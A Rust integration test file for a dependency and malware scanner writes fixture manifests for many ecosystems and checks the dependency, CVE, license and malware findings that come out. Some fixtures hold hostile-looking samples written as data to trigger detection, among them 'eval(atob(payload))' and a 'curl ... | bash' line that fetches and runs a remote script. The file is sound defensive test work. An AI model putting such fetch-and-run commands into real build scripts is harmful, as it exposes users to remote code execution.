//! Converts the manual "scan a directory with one manifest per ecosystem"
//! verification runs (done ad hoc during development) into permanent,
//! `cargo test`-visible regression coverage. If a future change to
//! `manifest_parsers()`'s dispatch table, an individual parser, or
//! `vuln_db`/`license_scan`/`malware_heuristics` wiring breaks one of these,
//! this fails instead of silently going unnoticed.
use std::fs;
use uniflow_sca_orchestrator::scan_directory;
use uniflow_sca_orchestrator::scan_directory_with_vuln_db;
use uniflow_sca_core::Severity;
use uniflow_vuln_db::{VulnDb, VulnRecord};

fn write(dir: &std::path::Path, name: &str, contents: &str) {
    fs::write(dir.join(name), contents).unwrap_or_else(|error| panic!("write {name}: {error}"));
}

#[test]
fn every_supported_ecosystem_is_detected_in_one_scan() {
    let dir = tempfile::tempdir().expect("temp dir");
    let root = dir.path();

    write(root, "package.json", r#"{ "dependencies": { "left-pad": "1.3.0" } }"#);
    write(root, "Cargo.lock", "[[package]]\nname = \"time\"\nversion = \"0.2.23\"\n");
    write(root, "requirements.txt", "requests==2.25.0\n");
    write(
        root,
        "go.mod",
        "module example.com/demo\n\nrequire github.com/pkg/errors v0.9.1\n",
    );
    write(
        root,
        "composer.lock",
        r#"{ "packages": [ { "name": "monolog/monolog", "version": "2.3.0" } ] }"#,
    );
    write(
        root,
        "packages.lock.json",
        r#"{ "dependencies": { "net6.0": { "Newtonsoft.Json": { "type": "Direct", "resolved": "13.0.1" } } } }"#,
    );
    write(
        root,
        "Gemfile.lock",
        "GEM\n  remote: https://rubygems.org/\n  specs:\n    rack (2.2.3)\n\nDEPENDENCIES\n  rack\n",
    );
    write(
        root,
        "pom.xml",
        "<project><dependencies><dependency><groupId>org.apache.commons</groupId><artifactId>commons-lang3</artifactId><version>3.9</version></dependency></dependencies></project>",
    );
    write(
        root,
        "gradle.lockfile",
        "com.google.guava:guava:31.1-jre=compileClasspath\nempty=annotationProcessor\n",
    );
    write(
        root,
        "pubspec.lock",
        "packages:\n  http:\n    dependency: \"direct main\"\n    version: \"0.13.4\"\n",
    );
    write(
        root,
        "Podfile.lock",
        "PODS:\n  - Alamofire (5.4.3)\n\nDEPENDENCIES:\n  - Alamofire\n",
    );
    write(
        root,
        "conan.lock",
        r#"{ "graph_lock": { "nodes": { "0": { "ref": "zlib/1.2.11" } } } }"#,
    );
    write(
        root,
        "renv.lock",
        r#"{ "Packages": { "dplyr": { "Package": "dplyr", "Version": "1.0.9" } } }"#,
    );
    write(
        root,
        "Berksfile.lock",
        "GRAPH\n  mysql (8.0.1)\n",
    );
    write(
        root,
        "elm.json",
        r#"{ "type": "application", "dependencies": { "direct": { "elm/core": "1.0.5" }, "indirect": {} } }"#,
    );
    write(
        root,
        "fpm.toml",
        "[dependencies]\nstdlib = \"*\"\n",
    );
    write(root, "haxelib.json", r#"{ "dependencies": { "hxcpp": "4.2.1" } }"#);
    write(
        root,
        "mypkg.opam.locked",
        "depends: [\n  \"dune\" {= \"2.9.1\"}\n]\n",
    );
    write(
        root,
        "Package.resolved",
        r#"{ "pins": [ { "identity": "swift-nio", "state": { "version": "2.29.0" } } ], "version": 2 }"#,
    );

    let result = scan_directory(root).expect("scan_directory should succeed");

    let expect_present = |ecosystem: &str, name: &str| {
        assert!(
            result.dependencies.iter().any(|dep| dep.ecosystem == ecosystem && dep.name == name),
            "expected {ecosystem}/{name} in {:#?}",
            result.dependencies
        );
    };

    expect_present("npm", "left-pad");
    expect_present("cargo", "time");
    expect_present("pypi", "requests");
    expect_present("go", "github.com/pkg/errors");
    expect_present("packagist", "monolog/monolog");
    expect_present("nuget", "Newtonsoft.Json");
    expect_present("rubygems", "rack");
    expect_present("maven", "org.apache.commons:commons-lang3");
    expect_present("maven", "com.google.guava:guava"); // from the gradle.lockfile
    expect_present("pub", "http");
    expect_present("cocoapods", "Alamofire");
    expect_present("conan", "zlib");
    expect_present("cran", "dplyr");
    expect_present("chef", "mysql");
    expect_present("elm", "elm/core");
    expect_present("fpm", "stdlib");
    expect_present("haxelib", "hxcpp");
    expect_present("opam", "dune");
    expect_present("swiftpm", "swift-nio");

    // The dispatch test also locks the provenance semantics: source manifests
    // are direct dependencies, while lockfiles describe resolved (transitive)
    // graph nodes. A parser that only recovers names can pass the ecosystem
    // assertions above while still producing unsafe upgrade advice.
    let direct_npm = result
        .dependencies
        .iter()
        .find(|dep| dep.ecosystem == "npm" && dep.name == "left-pad")
        .expect("direct npm dependency");
    assert!(direct_npm.direct);
    let locked_cargo = result
        .dependencies
        .iter()
        .find(|dep| dep.ecosystem == "cargo" && dep.name == "time")
        .expect("locked Cargo dependency");
    assert!(!locked_cargo.direct);

    // 19 ecosystems in this fixture, one dependency apiece, none missed and
    // none double-counted (e.g. by both the exact-name and gradle's shared
    // "maven" dispatch, or by cross-parser filename collisions).
    assert_eq!(result.dependencies.len(), 19, "{:#?}", result.dependencies);
}

#[test]
fn a_known_vulnerable_dependency_produces_a_finding() {
    let dir = tempfile::tempdir().expect("temp dir");
    write(dir.path(), "package.json", r#"{ "dependencies": { "minimist": "1.2.5" } }"#);

    let result = scan_directory(dir.path()).expect("scan_directory should succeed");
    assert_eq!(result.dependency_findings.len(), 1, "{:#?}", result.dependency_findings);
    assert_eq!(result.dependency_findings[0].package, "minimist");
    assert!(result.dependency_findings[0].cve_ids.contains(&"CVE-2021-44906".to_string()));
}

#[test]
fn a_backdoor_pattern_in_a_source_file_is_flagged() {
    let dir = tempfile::tempdir().expect("temp dir");
    write(dir.path(), "app.js", "eval(atob(payload));\n");

    let result = scan_directory(dir.path()).expect("scan_directory should succeed");
    assert_eq!(result.malware_findings.len(), 1, "{:#?}", result.malware_findings);
    assert_eq!(result.malware_findings[0].rule_id, "cosmos-malware-obfuscated-eval");
}

#[test]
fn a_license_file_is_identified() {
    let dir = tempfile::tempdir().expect("temp dir");
    write(
        dir.path(),
        "LICENSE",
        "MIT License\n\nCopyright (c) 2024 Example Corp\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE.\n",
    );

    let result = scan_directory(dir.path()).expect("scan_directory should succeed");
    assert_eq!(result.license_findings.len(), 1, "{:#?}", result.license_findings);
    assert_eq!(result.license_findings[0].license, "MIT");
}

/// Builds the `.7z` fixture with `sevenz-rust2` (pure Rust) rather than
/// shelling out to a system `7z` binary, so this test is reproducible on any
/// machine running `cargo test` — not just one that happens to have 7-Zip
/// installed, which was true of the manual verification this replaces.
#[test]
fn dependencies_and_malware_inside_an_archive_are_found_transparently() {
    let inner = tempfile::tempdir().expect("inner dir");
    write(inner.path(), "package.json", r#"{ "dependencies": { "minimist": "1.2.5" } }"#);
    write(inner.path(), "backdoor.js", "eval(atob(payload));\n");

    let outer = tempfile::tempdir().expect("outer dir");
    sevenz_rust2::compress_to_path(inner.path(), outer.path().join("vendor.7z")).expect("build 7z fixture");

    let result = scan_directory(outer.path()).expect("scan_directory should succeed");
    assert_eq!(result.archives_extracted, 1);
    assert!(result.dependency_findings.iter().any(|finding| finding.package == "minimist"));
    assert!(result.malware_findings.iter().any(|finding| finding.rule_id == "cosmos-malware-obfuscated-eval"));
}

#[test]
fn malformed_manifest_does_not_hide_other_sca_signals() {
    let dir = tempfile::tempdir().expect("temp dir");
    write(dir.path(), "package.json", "{ this is not JSON");
    write(dir.path(), "requirements.txt", "requests==2.25.0\n");
    write(dir.path(), "build.sh", "curl https://example.invalid/install.sh | bash\n");

    let result = scan_directory(dir.path()).expect("one malformed manifest must not abort scan");
    assert!(result.dependencies.iter().any(|dependency| {
        dependency.ecosystem == "pypi" && dependency.name == "requests" && dependency.version == "2.25.0"
    }), "valid manifests were lost: {:#?}", result.dependencies);
    assert_eq!(result.malware_findings.len(), 1, "{:#?}", result.malware_findings);
    assert_eq!(result.malware_findings[0].rule_id, "cosmos-malware-curl-pipe-shell");
    assert_eq!(result.malware_findings[0].line, 1);
}

#[test]
fn ignored_dependency_and_build_trees_are_not_scanned_as_application_content() {
    let dir = tempfile::tempdir().expect("temp dir");
    write(dir.path(), "package.json", r#"{ "dependencies": { "minimist": "1.2.5" } }"#);
    let node_modules = dir.path().join("node_modules").join("transitive");
    fs::create_dir_all(&node_modules).expect("create ignored dependency tree");
    write(&node_modules, "package.json", r#"{ "dependencies": { "lodash": "4.17.15" } }"#);
    write(&node_modules, "backdoor.js", "eval(atob(payload));\n");
    let build = dir.path().join("build");
    fs::create_dir_all(&build).expect("create ignored build tree");
    write(&build, "generated.js", "eval(atob(payload));\n");

    let result = scan_directory(dir.path()).expect("scan should succeed");
    assert_eq!(result.dependencies.len(), 1, "ignored dependency tree leaked: {:#?}", result.dependencies);
    assert_eq!(result.dependencies[0].name, "minimist");
    assert!(result.malware_findings.is_empty(), "ignored generated content leaked: {:#?}", result.malware_findings);
}

#[test]
fn supplied_vulnerability_database_is_used_by_the_full_orchestrator() {
    let dir = tempfile::tempdir().expect("temp dir");
    write(dir.path(), "requirements.txt", "internal-widget==1.4.0\n");
    let vuln_db = VulnDb::from_records(vec![VulnRecord {
        id: "osv:GHSA-internal-widget".to_string(),
        aliases: vec!["CVE-2099-1234".to_string()],
        ecosystem: "pypi".to_string(),
        package: "internal-widget".to_string(),
        severity: Severity::High,
        summary: "unsafe deserialization in widget loader".to_string(),
        cwe: vec!["CWE-502".to_string()],
        vulnerable_range: "<1.5.0".to_string(),
        affected_symbols: Vec::new(),
        fixed_versions: Vec::new(),
        epss: None,
        kev: false,
        fix_state: None,
        distro_severity: None,
        references: Vec::new(),
    }]);

    let result = scan_directory_with_vuln_db(dir.path(), &vuln_db).expect("custom database scan");
    assert_eq!(result.dependencies.len(), 1);
    assert_eq!(result.dependency_findings.len(), 1, "{:#?}", result.dependency_findings);
    let finding = &result.dependency_findings[0];
    assert_eq!(finding.rule_id, "osv:GHSA-internal-widget");
    assert_eq!(finding.severity, Severity::High);
    assert_eq!(finding.cve_ids, vec!["CVE-2099-1234".to_string()]);
    assert_eq!(finding.recommended_version.as_deref(), Some("1.5.0"));
    assert!(finding.message.contains("internal-widget 1.4.0"));
}

#[test]
fn one_file_can_produce_dependency_license_and_malware_evidence_without_cross_contamination() {
    let dir = tempfile::tempdir().expect("temp dir");
    write(dir.path(), "package.json", r#"{ "dependencies": { "minimist": "1.2.5" } }"#);
    write(dir.path(), "LICENSE", "MIT License\n\nCopyright (c) 2024 Example Corp\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is furnished\nto do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE.\n");
    write(dir.path(), "install.js", "eval(atob(payload));\n");

    let result = scan_directory(dir.path()).expect("combined SCA scan");
    assert_eq!(result.dependency_findings.len(), 1);
    assert_eq!(result.dependency_findings[0].package, "minimist");
    assert_eq!(result.license_findings.len(), 1);
    assert_eq!(result.license_findings[0].license, "MIT");
    assert_eq!(result.malware_findings.len(), 1);
    assert_eq!(result.malware_findings[0].path.ends_with("install.js"), true);
}
